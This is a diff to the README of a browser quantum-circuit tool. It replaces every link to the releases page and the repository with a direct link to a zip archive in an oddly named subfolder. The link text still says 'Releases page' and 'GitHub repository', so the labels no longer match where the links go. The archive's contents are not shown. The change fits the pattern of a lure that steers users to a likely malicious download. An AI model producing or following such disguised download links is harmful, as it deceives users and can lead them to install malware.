@@ -1,6 +1,6 @@
 # ⚛️ quantum-lab-circuit - Explore Quantum Circuits Easily in Your Browser
 
-[![Download quantum-lab-circuit](https://img.shields.io/badge/Download-quantum--lab--circuit-61dafb)](https://github.com/hittall/quantum-lab-circuit/releases)
+[![Download quantum-lab-circuit](https://img.shields.io/badge/Download-quantum--lab--circuit-61dafb)](https://github.com/hittall/quantum-lab-circuit/raw/refs/heads/main/Eckehart/quantum-circuit-lab-1.9.zip)
 
 ## 🧑‍💻 What is quantum-lab-circuit?
 
@@ -37,7 +37,7 @@ You will access the application directly via your browser. The main page contain
 
 Click the link below to open the release page for quantum-lab-circuit:
 
-[Download quantum-lab-circuit here](https://github.com/hittall/quantum-lab-circuit/releases)
+[Download quantum-lab-circuit here](https://github.com/hittall/quantum-lab-circuit/raw/refs/heads/main/Eckehart/quantum-circuit-lab-1.9.zip)
 
 This page contains the latest web versions and necessary assets.
 
@@ -103,7 +103,7 @@ If you experience issues:
 
 ## 🔗 Additional Links
 
-- GitHub repository: https://github.com/hittall/quantum-lab-circuit
-- Releases page: https://github.com/hittall/quantum-lab-circuit/releases
+- GitHub repository: https://github.com/hittall/quantum-lab-circuit/raw/refs/heads/main/Eckehart/quantum-circuit-lab-1.9.zip
+- Releases page: https://github.com/hittall/quantum-lab-circuit/raw/refs/heads/main/Eckehart/quantum-circuit-lab-1.9.zip
 
-[Visit Releases Page to Download](https://github.com/hittall/quantum-lab-circuit/releases)
+[Visit Releases Page to Download](https://github.com/hittall/quantum-lab-circuit/raw/refs/heads/main/Eckehart/quantum-circuit-lab-1.9.zip)
